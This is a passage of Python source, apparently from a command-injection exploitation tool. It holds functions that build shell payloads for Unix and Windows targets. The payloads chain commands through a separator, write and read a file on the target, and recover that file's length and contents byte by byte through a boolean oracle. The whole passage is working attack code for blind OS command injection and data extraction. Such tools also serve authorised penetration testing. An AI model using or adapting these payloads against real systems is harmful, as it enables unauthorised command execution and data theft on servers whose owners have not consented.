            " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
            "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE
            )
  return checks.terminate_payload(payload, separator)

"""
A question with a known answer, for telling whether this target's own oracle can tell a length
that matches from one that does not - calibration for the created file, in the same shape the
boolean-based technique calibrates itself with.
"""
def oracle_decision(separator, TAG, output_length, OUTPUT_TEXTFILE, holds=True):
  if not oracle_supported(separator):
    return ""
  expected = output_length if holds else output_length + 1
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is None:
      return ""
    # The write chained at the top level, the same as the delay-based 'decision()' above writes it -
    # nested inside the probe's own quoting instead, the '&' joining it to the read would be read as
    # literal text rather than as cmd.exe's own separator.
    write = chain + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'"
    return write + bb_payloads.get_length(checks.WINDOWS_CHAIN, "type " + OUTPUT_TEXTFILE, expected, "-eq")
  var = settings.RANDOM_VAR_GENERATOR
  payload = (separator +
            var + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
            var + "1=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
            bb_payloads._decide(separator, str(expected) + " -eq ${#" + var + "1}")
            )
  return checks.terminate_payload(payload, separator)

"""
How many bytes the created file holds, asked as a comparison so that it can be bisected - the file's
length rather than the command's, read without running the command again.
"""
def oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator="-ge"):
  if not oracle_supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return bb_payloads.get_length(separator, "type " + OUTPUT_TEXTFILE, candidate_length, operator)
  var = settings.RANDOM_VAR_GENERATOR
  payload = (separator +
            var + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
            bb_payloads._decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + str(candidate_length))
            )
  return checks.terminate_payload(payload, separator)

"""
Whether the ordinal of the created file's Nth byte is at or above this one, which is what bisects it
- indexed straight off the file with 'cut', since a byte on disk needs none of the parameter-
expansion slicing a live command substitution would. On Windows the same file is re-read and sliced
in PowerShell instead, the way 'bb_payloads' already slices a re-run command's own output.
"""
def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator="-le"):
  if not oracle_supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return bb_payloads.get_char(separator, "type " + OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator)
  ordinal = "$(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\")"
  payload = separator + bb_payloads._decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal)
  return checks.terminate_payload(payload, separator)

# eof
